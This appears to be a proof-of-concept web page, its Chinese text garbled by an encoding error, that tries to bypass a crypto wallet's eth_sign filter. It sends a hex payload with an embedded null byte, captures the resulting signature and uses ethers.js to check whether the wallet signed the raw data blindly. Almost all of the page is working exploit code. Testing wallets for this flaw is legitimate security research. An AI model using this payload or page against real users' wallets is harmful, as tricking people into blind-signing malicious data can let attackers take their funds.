<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>eth_sign 0x00 ç»•è¿‡ä¸è‡ªåŠ¨åŒ–é‰´å®š PoC</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.11.1/ethers.umd.min.js"></script>
    <style>
        body { font-family: monospace; max-width: 900px; margin: 20px auto; padding: 20px; background-color: #f4f4f9; color: #333; }
        h2 { color: #2c3e50; }
        button { padding: 12px 20px; margin: 10px 10px 10px 0; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 6px; font-weight: bold; font-size: 14px;}
        button.danger { background-color: #dc3545; }
        button:hover { opacity: 0.9; }
        button:disabled { background-color: #cccccc; cursor: not-allowed; color: #666;}
        #console { background: #1e1e1e; color: #00ff00; padding: 15px; border-radius: 8px; height: 450px; overflow-y: auto; white-space: pre-wrap; font-size: 13px; border: 2px solid #333; line-height: 1.4; }
        .info-box { margin-bottom: 20px; padding: 15px; background: #e9ecef; border-left: 5px solid #dc3545; border-radius: 4px; line-height: 1.5; }
    </style>
</head>
<body>
    <h2>Wallet eth_sign 0x00 æ¼æ´åˆ©ç”¨ä¸é‰´å®šå™¨</h2>
    <div class="info-box">
        <strong>æ¸—é€è·¯å¾„ï¼š</strong><br>
        1. åˆ©ç”¨ <code>0x00</code> (Null Byte) å‡»ç©¿é’±åŒ…åº•å±‚å¯¹ eth_sign çš„ RPC æ‹¦æˆªè¿‡æ»¤ç½‘ã€‚<br>
        2. æˆåŠŸå”¤èµ· UI åï¼Œæ•è·ç­¾åï¼Œå¹¶ä½¿ç”¨ ethers.js é‰´å®šè¯¥ç»•è¿‡æ˜¯å¦èƒ½è·å–åˆ°çœŸå®çš„åº•å±‚ç›²ç­¾ã€‚
    </div>

    <div>
        <button id="btnConnect">1. è¿æ¥æµ‹è¯•é’±åŒ…</button>
        å½“å‰åœ°å€: <span id="walletAddress" style="font-weight: bold; color: #007bff;">æœªè¿æ¥</span>
    </div>

    <div style="margin-top: 15px; border-top: 1px dashed #ccc; padding-top: 15px;">
        <button id="btnNullByteSign" class="danger" disabled>2. å‘é€ 0x00 ç»•è¿‡ Payload å¹¶é‰´å®š</button>
    </div>

    <h3 style="margin-top: 30px;">è§£ææ§åˆ¶å°:</h3>
    <div id="console">ç­‰å¾…æ“ä½œ...</div>

    <script>
        const btnConnect = document.getElementById('btnConnect');
        const btnNullByteSign = document.getElementById('btnNullByteSign');
        const elAddress = document.getElementById('walletAddress');
        const elConsole = document.getElementById('console');

        let currentAccount = null;

        function log(message) {
            const time = new Date().toLocaleTimeString();
            elConsole.innerHTML += `[${time}] ${message}\n`;
            elConsole.scrollTop = elConsole.scrollHeight;
        }

        btnConnect.addEventListener('click', async () => {
            if (typeof window.ethereum !== 'undefined') {
                try {
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    currentAccount = accounts[0]; 
                    elAddress.innerText = currentAccount;
                    log(`âœ… é’±åŒ…è¿æ¥æˆåŠŸã€‚`);
                    btnNullByteSign.disabled = false;
                } catch (error) {
                    log(`âŒ è¿æ¥é”™è¯¯: ${error.message}`);
                }
            } else {
                log("âš ï¸ æœªæ£€æµ‹åˆ° window.ethereumã€‚");
            }
        });

        btnNullByteSign.addEventListener('click', async () => {
            if (!currentAccount) return;
            
            // æ ¸å¿ƒï¼šä½¿ç”¨åŒ…å« 00 å­—èŠ‚çš„ Payload å‡»ç©¿è¿‡æ»¤å™¨
            // "SafeMessage" (536166654d657373616765) + \x00 (00) + "EvilData" (4576696c44617461)
            const bypassPayload = "0x536166654d657373616765004576696c44617461";
            
            log(`\n--- ğŸš€ å°è¯• 0x00 æ¼æ´ç»•è¿‡ ---`);
            log(`å‘é€çš„ç•¸å½¢ Payload (Hex): ${bypassPayload}`);
            
            try {
                const signature = await window.ethereum.request({
                    method: 'eth_sign',
                    params: [currentAccount, bypassPayload]
                });
                
                log(`ğŸš¨ [ç»•è¿‡æˆåŠŸ] æˆåŠŸå‡»ç©¿æ‹¦æˆªï¼Œæ‹¿åˆ°ç­¾å:\n${signature}\n`);
                log(`ğŸ” æ­£åœ¨è°ƒç”¨ ethers.js é‰´å®šè¿™æ˜¯çœŸç›²ç­¾è¿˜æ˜¯ä¼ªè£…...`);

                verifySignature(bypassPayload, signature, currentAccount.toLowerCase());

            } catch (error) {
                log(`ğŸ›¡ï¸ ä¾ç„¶è¢«æ‹¦æˆª: ${error.message}`);
            }
        });

        function verifySignature(payload, signature, addressLowerCase) {
            if (typeof ethers === 'undefined') return;

            let isEthSign = false;
            let isPersonalSign = false;

            try {
                // æµ‹è¯•æ˜¯å¦ä¸ºçº¯æ­£ç›²ç­¾ (ç”±äºåŒ…å« 00ï¼Œç›´æ¥ä¼ å…¥è¿›è¡Œåº•å±‚æ¢å¤)
                const recoveredEth = ethers.recoverAddress(payload, signature).toLowerCase();
                if (recoveredEth === addressLowerCase) isEthSign = true;
            } catch (e) {}

            try {
                // æµ‹è¯•æ˜¯å¦è¢«å·å·åŒ…è£…æˆ EIP-191
                const payloadBytes = ethers.getBytes(payload);
                const recoveredPersonal = ethers.verifyMessage(payloadBytes, signature).toLowerCase();
                if (recoveredPersonal === addressLowerCase) isPersonalSign = true;
            } catch (e) {}

            if (isEthSign) {
                log(`ğŸ’¥ [è‡´å‘½æ¼æ´] é‰´å®šç»“æœï¼šè¿™æ˜¯çœŸå®çš„ eth_sign ç›²ç­¾ï¼`);
                log(`ğŸ‘‰ ç»“è®ºï¼šè¯¥é’±åŒ…ä¸ä»…è¢« 0x00 ç»•è¿‡äº†é˜²çº¿ï¼Œè€Œä¸”åº•å±‚ç›´æ¥å¯¹æ¶æ„æ•°æ®è¿›è¡Œäº†è£¸ç­¾ã€‚è¿™å±äºé«˜å±æ¼æ´ï¼`);
            } else if (isPersonalSign) {
                log(`âš ï¸ [å®‰å…¨ä¼ªè£…] é‰´å®šç»“æœï¼šå·²è¢«åº•å±‚è½¬æ¢ä¸º personal_signï¼`);
                log(`ğŸ‘‰ ç»“è®ºï¼šè™½ç„¶ 0x00 å‡»ç©¿äº†ç¬¬ä¸€é“ RPC æ‹¦æˆªå¢™å¯¼è‡´äº†å¼¹çª—ï¼Œä½†åº•å±‚çš„åŠ å¯†æ¨¡å—ä¾ç„¶å®ˆä½äº†åº•çº¿ï¼Œå¼ºåˆ¶åŠ ä¸Šäº† EIP-191 å‰ç¼€ã€‚èµ„äº§æ˜¯å®‰å…¨çš„ï¼Œä½†è¿™ä¾ç„¶æ˜¯ä¸€ä¸ª UI/RPC å±‚çš„ç»•è¿‡ç¼ºé™·ã€‚`);
            } else {
                log(`â“ [æœªçŸ¥æ ‡å‡†] é‰´å®šç»“æœï¼šæ— æ³•åŒ¹é…ä¸»æµæ ‡å‡†ã€‚`);
            }
        }
    </script>
</body>
</html>
